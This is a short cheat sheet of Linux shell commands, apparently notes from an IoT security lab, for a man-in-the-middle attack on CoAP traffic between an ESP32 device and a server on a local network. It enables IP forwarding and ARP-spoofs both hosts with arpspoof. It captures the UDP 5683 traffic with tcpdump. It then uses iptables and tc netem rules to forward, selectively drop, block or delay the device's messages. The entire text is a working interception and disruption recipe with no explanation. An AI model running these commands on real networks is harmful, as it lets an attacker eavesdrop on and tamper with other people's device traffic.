sudo echo 1 >/proc/sys/net/ipv4/ip_forward
sudo arpspoof -i wlp0s20f3 -t 192.168.115.245 192.168.115.142 # Terminal 1
sudo arpspoof -i wlp0s20f3 -t 192.168.115.142 192.168.115.245 # Terminal 2
sudo tcpdump -i wlp0s20f3 udp port 5683

##iptable rules
# Allow forwarding from ESP32 to server
sudo iptables -A FORWARD -p udp -s 192.168.115.245 -d 192.168.115.142 --dport 5683 -j ACCEPT

# Allow forwarding from server to ESP32
sudo iptables -A FORWARD -p udp -s 192.168.115.142 -d 192.168.115.245 --sport 5683 -j ACCEPT

# Enable NAT masquerading (to rewrite source IP)
sudo iptables -t nat -A POSTROUTING -o wlp0s20f3 -j MASQUERADE

##selective block
sudo iptables -A INPUT -p udp --dport 5683 -m length --length 77 -j DROP
sudo iptables -A FORWARD -p udp --dport 5683 -m length --length 77 -j DROP

##block
sudo iptables -A OUTPUT -p udp --dport 5683 -j DROP
sudo iptables -A FORWARD -p udp --dport 5683 -j DROP

##unblock
sudo iptables -D OUTPUT -p udp --dport 5683 -j DROP
sudo iptables -D FORWARD -p udp --dport 5683 -j DROP

##delay
sudo tc qdisc add dev wlp0s20f3 root netem delay 500ms
